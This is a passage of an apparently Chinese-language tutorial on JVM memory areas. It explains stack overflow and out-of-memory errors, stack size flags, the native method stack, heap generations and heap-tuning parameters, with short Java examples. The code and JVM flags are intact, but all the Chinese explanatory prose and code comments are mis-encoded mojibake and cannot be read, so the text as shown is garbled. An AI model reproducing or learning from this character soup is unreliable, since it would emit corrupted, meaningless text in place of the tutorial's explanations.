<p><strong>1. StackOverflowErrorï¼ˆæ ˆæº¢å‡ºé”™è¯¯ï¼‰</strong></p>
<p>å½“çº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦è¶…è¿‡è™šæ‹Ÿæœºå…è®¸çš„æœ€å¤§æ·±åº¦æ—¶ï¼Œä¼šæŠ›å‡ºStackOverflowErrorã€‚</p>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ul>
<li>é€’å½’è°ƒç”¨è¿‡æ·±</li>
<li>å±€éƒ¨å˜é‡è¿‡å¤š</li>
<li>æ–¹æ³•è°ƒç”¨é“¾è¿‡é•¿</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StackOverflow</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recursive</span><span class="hljs-params">()</span> {
        count++;  <span class="hljs-comment">// æ¯æ¬¡é€’å½’ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§</span>
        recursive();  <span class="hljs-comment">// æ— é™é€’å½’ï¼Œæ ˆå¸§ä¸æ–­å…¥æ ˆï¼Œæœ€ç»ˆæ ˆæº¢å‡º</span>
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä¼˜åŒ–é€’å½’ç®—æ³•ï¼Œæ”¹ä¸ºè¿­ä»£</li>
<li>å‡å°‘å±€éƒ¨å˜é‡</li>
<li>å¢åŠ æ ˆå¤§å°ï¼ˆ-Xsså‚æ•°ï¼‰</li>
</ul>
<p><strong>2. OutOfMemoryErrorï¼ˆå†…å­˜æº¢å‡ºé”™è¯¯ï¼‰</strong></p>
<p>å¦‚æœè™šæ‹Ÿæœºæ ˆå¯ä»¥åŠ¨æ€æ‰©å±•ï¼Œå½“æ‰©å±•æ—¶æ— æ³•ç”³è¯·åˆ°è¶³å¤Ÿçš„å†…å­˜æ—¶ï¼Œä¼šæŠ›å‡ºOutOfMemoryErrorã€‚</p>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ul>
<li>åˆ›å»ºçº¿ç¨‹è¿‡å¤šï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½éœ€è¦æ ˆç©ºé—´</li>
<li>æ ˆè®¾ç½®è¿‡å¤§ï¼Œå¯¼è‡´æ€»å†…å­˜ä¸è¶³</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StackOOM</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                    <span class="hljs-comment">// çº¿ç¨‹ä¸é€€å‡ºï¼Œæ ˆç©ºé—´ä¸é‡Šæ”¾</span>
                }
            }).start();  <span class="hljs-comment">// åˆ›å»ºè¿‡å¤šçº¿ç¨‹ï¼Œå¯¼è‡´OOM</span>
        }
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>å‡å°‘çº¿ç¨‹æ•°</li>
<li>å‡å°æ ˆå¤§å°</li>
<li>ä¼˜åŒ–çº¿ç¨‹ä½¿ç”¨æ–¹å¼</li>
</ul>
<h4 data-id="heading-30">4.5 æ ˆå¤§å°è®¾ç½®</h4>
<p><strong>-Xsså‚æ•°ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">-Xss1m  <span class="hljs-comment">// è®¾ç½®æ ˆå¤§å°ä¸º1MB</span>
-Xss2m  <span class="hljs-comment">// è®¾ç½®æ ˆå¤§å°ä¸º2MB</span>
</code></pre>
<p><strong>é»˜è®¤å€¼ï¼š</strong></p>
<ul>
<li>ä¸åŒå¹³å°å’ŒJVMç‰ˆæœ¬ä¸åŒ</li>
<li>é€šå¸¸ä¸º1MBå·¦å³ï¼ˆLinux/x86ï¼š1024KBï¼ŒWindowsï¼šé»˜è®¤ä¾èµ–äºè™šæ‹Ÿå†…å­˜ï¼‰</li>
</ul>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>æ ˆå¤§å°è®¾ç½®è¿‡å°ï¼šå¯èƒ½å¯¼è‡´StackOverflowError</li>
<li>æ ˆå¤§å°è®¾ç½®è¿‡å¤§ï¼šå¯èƒ½æµªè´¹å†…å­˜ï¼Œæˆ–å¯¼è‡´å¯åˆ›å»ºçš„çº¿ç¨‹æ•°å‡å°‘</li>
</ul>
<h4 data-id="heading-31">4.6 ä¸JMMå·¥ä½œå†…å­˜çš„å…³ç³»</h4>
<p><strong>å¯¹åº”å…³ç³»ï¼š</strong></p>
<ul>
<li>JMMä¸­çš„"å·¥ä½œå†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"è™šæ‹Ÿæœºæ ˆå±€éƒ¨å˜é‡è¡¨"</li>
<li>å±€éƒ¨å˜é‡è¡¨ä¸­å­˜å‚¨çš„å˜é‡å‰¯æœ¬å°±æ˜¯JMMå·¥ä½œå†…å­˜çš„å†…å®¹</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JMMRelation</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// ä¸»å†…å­˜ï¼ˆå †ï¼‰</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// ä»ä¸»å†…å­˜è¯»å–åˆ°å·¥ä½œå†…å­˜ï¼ˆå±€éƒ¨å˜é‡è¡¨ï¼‰</span>
        local = local + <span class="hljs-number">1</span>;   <span class="hljs-comment">// åœ¨å·¥ä½œå†…å­˜ä¸­è®¡ç®—</span>
        shared = local;      <span class="hljs-comment">// å†™å›ä¸»å†…å­˜ï¼ˆå †ï¼‰</span>
    }
}
</code></pre>
<h3 data-id="heading-32">5. æœ¬åœ°æ–¹æ³•æ ˆï¼ˆNative Method Stackï¼‰</h3>
<h4 data-id="heading-33">5.1 ä½œç”¨</h4>
<p>æœ¬åœ°æ–¹æ³•æ ˆä¸è™šæ‹Ÿæœºæ ˆçš„ä½œç”¨éå¸¸ç›¸ä¼¼ï¼ŒåŒºåˆ«åœ¨äºï¼š</p>
<ul>
<li>è™šæ‹Ÿæœºæ ˆä¸ºJavaæ–¹æ³•æœåŠ¡</li>
<li>æœ¬åœ°æ–¹æ³•æ ˆä¸ºNativeæ–¹æ³•ï¼ˆæœ¬åœ°æ–¹æ³•ï¼‰æœåŠ¡</li>
</ul>
<p><strong>Nativeæ–¹æ³•ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨nativeå…³é”®å­—å£°æ˜çš„æ–¹æ³•</li>
<li>é€šå¸¸ç”¨C/C++ç­‰è¯­è¨€å®ç°</li>
<li>é€šè¿‡JNIï¼ˆJava Native Interfaceï¼‰è°ƒç”¨</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NativeExample</span> {
    <span class="hljs-comment">// Nativeæ–¹æ³•å£°æ˜</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nativeMethod</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// åŠ è½½æœ¬åœ°åº“</span>
        System.loadLibrary(<span class="hljs-string">"nativeLib"</span>);
    }
}
</code></pre>
<h4 data-id="heading-34">5.2 ä¸è™šæ‹Ÿæœºæ ˆçš„åŒºåˆ«</h4>






























<table><thead><tr><th>ç‰¹æ€§</th><th>è™šæ‹Ÿæœºæ ˆ</th><th>æœ¬åœ°æ–¹æ³•æ ˆ</th></tr></thead><tbody><tr><td><strong>æœåŠ¡å¯¹è±¡</strong></td><td>Javaæ–¹æ³•</td><td>Nativeæ–¹æ³•</td></tr><tr><td><strong>å­˜å‚¨å†…å®¹</strong></td><td>Javaæ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ç­‰</td><td>Nativeæ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ç­‰</td></tr><tr><td><strong>è¯­è¨€</strong></td><td>Javaå­—èŠ‚ç </td><td>C/C++ç­‰æœ¬åœ°ä»£ç </td></tr><tr><td><strong>å®ç°</strong></td><td>JVMå®ç°</td><td>å¯èƒ½ç”±JVMæˆ–æ“ä½œç³»ç»Ÿå®ç°</td></tr></tbody></table>
<p><strong>æ³¨æ„ï¼š</strong> æœ‰äº›JVMå®ç°ï¼ˆå¦‚HotSpotï¼‰å°†è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆåˆäºŒä¸ºä¸€ã€‚</p>
<h4 data-id="heading-35">5.3 å¼‚å¸¸æƒ…å†µ</h4>
<p>æœ¬åœ°æ–¹æ³•æ ˆä¹Ÿä¼šå‘ç”ŸStackOverflowErrorå’ŒOutOfMemoryErrorï¼ŒåŸå› å’Œè™šæ‹Ÿæœºæ ˆç±»ä¼¼ã€‚</p>
<h3 data-id="heading-36">6. Javaå †ï¼ˆJava Heapï¼‰- é‡ç‚¹</h3>
<h4 data-id="heading-37">6.1 å †çš„ç»“æ„å›¾ï¼ˆè¯¦ç»†ï¼‰</h4>
<pre><code class="hljs language-scss" lang="scss">Javaå †ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    æ–°ç”Ÿä»£(<span class="hljs-number">1</span>/<span class="hljs-number">3</span>)   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  <span class="hljs-built_in">Eden</span>(<span class="hljs-number">80%</span>)â”‚  â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”‚
â”‚  â”‚ <span class="hljs-built_in">S0</span>(<span class="hljs-number">10%</span>)S1 â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   è€å¹´ä»£(<span class="hljs-number">2</span>/<span class="hljs-number">3</span>)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-38">6.2 å †çš„ä½œç”¨</h4>
<p><strong>ä¸»è¦ä½œç”¨ï¼š</strong></p>
<ol>
<li><strong>å­˜å‚¨å¯¹è±¡å®ä¾‹</strong>ï¼šæ‰€æœ‰é€šè¿‡newåˆ›å»ºçš„å¯¹è±¡éƒ½å­˜å‚¨åœ¨å †ä¸­</li>
<li><strong>å­˜å‚¨æ•°ç»„</strong>ï¼šæ•°ç»„å¯¹è±¡ä¹Ÿå­˜å‚¨åœ¨å †ä¸­</li>
<li><strong>çº¿ç¨‹å…±äº«</strong>ï¼šæ‰€æœ‰çº¿ç¨‹å…±äº«å †å†…å­˜ï¼Œçº¿ç¨‹é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</li>
</ol>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeapExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¯¹è±¡å­˜å‚¨åœ¨å †ä¸­</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼Œobj1å¼•ç”¨åœ¨æ ˆä¸­</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼Œobj2å¼•ç”¨åœ¨æ ˆä¸­</span>
        
        <span class="hljs-comment">// æ•°ç»„ä¹Ÿå­˜å‚¨åœ¨å †ä¸­</span>
        <span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];   <span class="hljs-comment">// æ•°ç»„å¯¹è±¡åœ¨å †ä¸­ï¼Œarrayå¼•ç”¨åœ¨æ ˆä¸­</span>
        
        <span class="hljs-comment">// å­—ç¬¦ä¸²å¯¹è±¡ä¹Ÿåœ¨å †ä¸­ï¼ˆå­—ç¬¦ä¸²å¸¸é‡æ± ä¹Ÿåœ¨å †ä¸­ï¼ŒJDK 8ä¹‹åï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);  <span class="hljs-comment">// å­—ç¬¦ä¸²å¯¹è±¡åœ¨å †ä¸­</span>
    }
}
</code></pre>
<h4 data-id="heading-39">6.3 æ–°ç”Ÿä»£è¯¦è§£</h4>
<p><strong>æ–°ç”Ÿä»£ï¼ˆYoung Generationï¼‰çš„ä½œç”¨ï¼š</strong></p>
<p>æ–°ç”Ÿä»£æ˜¯å †çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚å¤§éƒ¨åˆ†å¯¹è±¡åœ¨æ–°ç”Ÿä»£ä¸­åˆ›å»ºï¼Œå¹¶ä¸”å¾ˆå¿«å°±ä¼šè¢«å›æ”¶ã€‚</p>
<p><strong>æ–°ç”Ÿä»£çš„ç»“æ„ï¼š</strong></p>
<ol>
<li>
<p><strong>EdenåŒºï¼ˆä¼Šç”¸å›­ï¼‰</strong></p>
<ul>
<li>æ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨EdenåŒº</li>
<li>çº¦å æ–°ç”Ÿä»£çš„80%</li>
<li>å¤§éƒ¨åˆ†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­ï¼Œåœ¨EdenåŒºå°±è¢«å›æ”¶</li>
</ul>
</li>
<li>
<p><strong>SurvivoråŒºï¼ˆå­˜æ´»åŒºï¼‰</strong></p>
<ul>
<li>åˆ†ä¸ºFrom Survivorå’ŒTo Survivorä¸¤ä¸ªåŒºåŸŸ</li>
<li>æ¯ä¸ªçº¦å æ–°ç”Ÿä»£çš„10%</li>
<li>ç”¨äºå­˜æ”¾Minor GCåå­˜æ´»çš„å¯¹è±¡</li>
</ul>
</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦SurvivoråŒºï¼Ÿ</strong></p>
<p>å¦‚æœæ²¡æœ‰SurvivoråŒºï¼ŒMinor GCåå­˜æ´»çš„å¯¹è±¡ä¼šç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li>è€å¹´ä»£å¾ˆå¿«è¢«å¡«æ»¡</li>
<li>é¢‘ç¹è§¦å‘Full GC</li>
<li>å½±å“æ€§èƒ½</li>
</ul>
<p>æœ‰äº†SurvivoråŒºï¼Œå¯ä»¥ï¼š</p>
<ul>
<li>è®©å¯¹è±¡åœ¨æ–°ç”Ÿä»£å¤šå­˜æ´»å‡ æ¬¡</li>
<li>åªæœ‰çœŸæ­£é•¿æœŸå­˜æ´»çš„å¯¹è±¡æ‰è¿›å…¥è€å¹´ä»£</li>
<li>å‡å°‘Full GCçš„é¢‘ç‡</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªSurvivoråŒºï¼Ÿ</strong></p>
<p>ä½¿ç”¨ä¸¤ä¸ªSurvivoråŒºå¯ä»¥å®ç°å¤åˆ¶ç®—æ³•ï¼š</p>
<ul>
<li>Minor GCæ—¶ï¼Œå°†EdenåŒºå’ŒFrom Survivorä¸­çš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°To Survivor</li>
<li>æ¸…ç©ºEdenåŒºå’ŒFrom Survivor</li>
<li>From Survivorå’ŒTo Survivorè§’è‰²äº’æ¢</li>
</ul>
<p>è¿™æ ·å¯ä»¥ï¼š</p>
<ul>
<li>ä¿è¯æ–°ç”Ÿä»£å§‹ç»ˆæœ‰ä¸€ä¸ªSurvivoråŒºæ˜¯ç©ºçš„</li>
<li>å®ç°é«˜æ•ˆçš„å¤åˆ¶ç®—æ³•</li>
<li>é¿å…å†…å­˜ç¢ç‰‡</li>
</ul>
<p><strong>å¯¹è±¡åœ¨æ–°ç”Ÿä»£ä¸­çš„æµè½¬ï¼š</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-number">1</span>. å¯¹è±¡åˆ›å»º â†’ EdenåŒº
   <span class="hljs-built_in">new</span> <span class="hljs-type">Object</span>() â†’ EdenåŒº

<span class="hljs-number">2</span>. EdenåŒºæ»¡ â†’ è§¦å‘Minor GC
   EdenåŒºæ»¡ â†’ Minor GCå¼€å§‹

<span class="hljs-number">3</span>. å­˜æ´»å¯¹è±¡ â†’ SurvivoråŒº
   EdenåŒºå­˜æ´»å¯¹è±¡ â†’ å¤åˆ¶åˆ°SurvivoråŒºï¼ˆ<span class="hljs-keyword">To</span>ï¼‰
   æ¸…ç©ºEdenåŒº

<span class="hljs-number">4</span>. å¯¹è±¡åœ¨SurvivoråŒºä¹‹é—´å¤åˆ¶
   Minor GC â†’ <span class="hljs-keyword">From</span> Survivorå­˜æ´»å¯¹è±¡ â†’ å¤åˆ¶åˆ°<span class="hljs-keyword">To</span> Survivor
   å¯¹è±¡å¹´é¾„+<span class="hljs-number">1</span>
   <span class="hljs-keyword">From</span>å’Œ<span class="hljs-keyword">To</span>è§’è‰²äº’æ¢

<span class="hljs-number">5</span>. å¹´é¾„è¾¾åˆ°é˜ˆå€¼ â†’ æ™‹å‡è€å¹´ä»£
   å¯¹è±¡å¹´é¾„è¾¾åˆ°<span class="hljs-number">15</span>ï¼ˆé»˜è®¤ï¼‰â†’ æ™‹å‡åˆ°è€å¹´ä»£
</code></pre>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">YoungGeneration</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ–°å¯¹è±¡åœ¨EdenåŒº</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶</span>
        }
        
        <span class="hljs-comment">// é•¿æœŸå­˜æ´»çš„å¯¹è±¡ä¼šç»å†å¤šæ¬¡GCåè¿›å…¥è€å¹´ä»£</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">longLived</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¦‚æœå¤šæ¬¡GCåä»å­˜æ´»ï¼Œä¼šè¿›å…¥è€å¹´ä»£</span>
    }
}
</code></pre>
<h4 data-id="heading-40">6.4 è€å¹´ä»£è¯¦è§£</h4>
<p><strong>è€å¹´ä»£ï¼ˆOld Generationï¼‰çš„ä½œç”¨ï¼š</strong></p>
<p>è€å¹´ä»£ç”¨äºå­˜æ”¾é•¿æœŸå­˜æ´»çš„å¯¹è±¡ã€‚ç»è¿‡å¤šæ¬¡Minor GCä»ç„¶å­˜æ´»çš„å¯¹è±¡ä¼šæ™‹å‡åˆ°è€å¹´ä»£ã€‚</p>
<p><strong>è€å¹´ä»£çš„ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li><strong>å¯¹è±¡ç”Ÿå‘½å‘¨æœŸé•¿</strong>ï¼šå­˜å‚¨çš„å¯¹è±¡é€šå¸¸ç”Ÿå‘½å‘¨æœŸè¾ƒé•¿</li>
<li><strong>GCé¢‘ç‡ä½</strong>ï¼šè€å¹´ä»£çš„GCï¼ˆFull GCï¼‰é¢‘ç‡è¾ƒä½</li>
<li><strong>GCè€—æ—¶é•¿</strong>ï¼šFull GCé€šå¸¸æ¯”Minor GCè€—æ—¶æ›´é•¿</li>
<li><strong>å ç”¨ç©ºé—´å¤§</strong>ï¼šé€šå¸¸å å †å†…å­˜çš„2/3</li>
</ol>
<p><strong>å¯¹è±¡è¿›å…¥è€å¹´ä»£çš„æ¡ä»¶ï¼š</strong></p>
<ol>
<li><strong>å¹´é¾„è¾¾åˆ°é˜ˆå€¼</strong>ï¼šå¯¹è±¡åœ¨SurvivoråŒºä¸­ç»å†GCçš„æ¬¡æ•°è¾¾åˆ°é˜ˆå€¼ï¼ˆé»˜è®¤15æ¬¡ï¼‰</li>
<li><strong>å¤§å¯¹è±¡</strong>ï¼šè¶…è¿‡-XX:PretenureSizeThresholdè®¾ç½®çš„å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
<li><strong>åŠ¨æ€å¹´é¾„åˆ¤å®š</strong>ï¼šSurvivoråŒºä¸­ç›¸åŒå¹´é¾„çš„å¯¹è±¡å¤§å°è¶…è¿‡SurvivoråŒºçš„ä¸€åŠï¼Œå¤§äºç­‰äºè¯¥å¹´é¾„çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OldGeneration</span> {
    <span class="hljs-comment">// é•¿æœŸå­˜æ´»çš„å¯¹è±¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; longLivedObjects = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createLongLivedObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è¿™äº›å¯¹è±¡ç»è¿‡å¤šæ¬¡GCåä»å­˜æ´»ï¼Œä¼šè¿›å…¥è€å¹´ä»£</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
            longLivedObjects.add(obj);  <span class="hljs-comment">// å¯¹è±¡è¢«å¼•ç”¨ï¼Œä¸ä¼šè¢«å›æ”¶</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-41">6.5 å †çš„å¤§å°è®¾ç½®ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>å¸¸ç”¨å‚æ•°ï¼š</strong></p>
<ul>
<li>
<p><strong>-Xms</strong>ï¼šåˆå§‹å †å¤§å°</p>
<ul>
<li>ä¾‹å¦‚ï¼š-Xms256mï¼ˆåˆå§‹å †256MBï¼‰</li>
</ul>
</li>
<li>
<p><strong>-Xmx</strong>ï¼šæœ€å¤§å †å¤§å°</p>
<ul>
<li>ä¾‹å¦‚ï¼š-Xmx1024mï¼ˆæœ€å¤§å †1GBï¼‰</li>
</ul>
</li>
<li>
<p><strong>-Xmn</strong>ï¼šæ–°ç”Ÿä»£å¤§å°</p>
<ul>
<li>ä¾‹å¦‚ï¼š-Xmn256mï¼ˆæ–°ç”Ÿä»£256MBï¼‰</li>
</ul>
</li>
<li>
<p><strong>-XX:NewRatio</strong>ï¼šæ–°ç”Ÿä»£ä¸è€å¹´ä»£çš„æ¯”ä¾‹</p>
<ul>
<li>ä¾‹å¦‚ï¼š-XX:NewRatio=2ï¼ˆæ–°ç”Ÿä»£:è€å¹´ä»£=1:2ï¼‰</li>
</ul>
</li>
<li>
<p><strong>-XX:SurvivorRatio</strong>ï¼šEdenä¸Survivorçš„æ¯”ä¾‹</p>
<ul>
<li>ä¾‹å¦‚ï¼š-XX:SurvivorRatio=8ï¼ˆEden:Survivor=8:1ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>è®¾ç½®ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">java -Xms512m -Xmx1024m -Xmn256m -XX:NewRatio=2 -XX:SurvivorRatio=8 MyApp
</code></pre>
<h4 data-id="heading-42">6.6 å †çš„å¼‚å¸¸</h4>
<p><strong>OutOfMemoryError: Java heap space</strong></p>
<p>å½“å †å†…å­˜ä¸è¶³ä»¥åˆ†é…æ–°å¯¹è±¡æ—¶ï¼Œä¼šæŠ›å‡ºOutOfMemoryError: Java heap spaceã€‚</p>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ol>
<li>å †å†…å­˜è®¾ç½®å¤ªå°</li>
<li>åˆ›å»ºçš„å¯¹è±¡å¤ªå¤š</li>
<li>å†…å­˜æ³„æ¼ï¼šå¯¹è±¡è¢«å¼•ç”¨æ— æ³•å›æ”¶</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeapOOM</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// ä¸æ–­åˆ›å»ºå¯¹è±¡ï¼Œæœ€ç»ˆå †å†…å­˜æº¢å‡º</span>
        }
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li>å¢åŠ å †å¤§å°ï¼š-Xmxå‚æ•°</li>
<li>ä¼˜åŒ–ä»£ç ï¼šå‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>æ’æŸ¥å†…å­˜æ³„æ¼ï¼šæ‰¾å‡ºæ— æ³•å›æ”¶çš„å¯¹è±¡</li>
</ol>
<h4 data-id="heading-43">6.7 ä¸JMMä¸»å†…å­˜çš„å…³ç³»</h4>
<p><strong>å¯¹åº”å…³ç³»ï¼š</strong></p>
<ul>
<li>JMMä¸­çš„"ä¸»å†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"å †"</li>
<li>å…±äº«å˜é‡å­˜å‚¨åœ¨å †ä¸­</li>
<li>å †æ˜¯çº¿ç¨‹å…±äº«çš„ï¼Œå¯¹åº”ä¸»å†…å­˜çš„å…±äº«ç‰¹æ€§</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeapAndJMM</span> {
    <span class="hljs-comment">// å…±äº«å˜é‡å­˜å‚¨åœ¨å †ä¸­ï¼ˆä¸»å†…å­˜ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// åœ¨å †ä¸­</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">thread1</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä»ä¸»å†…å­˜ï¼ˆå †ï¼‰è¯»å–</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// ä»å †è¯»å–åˆ°æ ˆ</span>
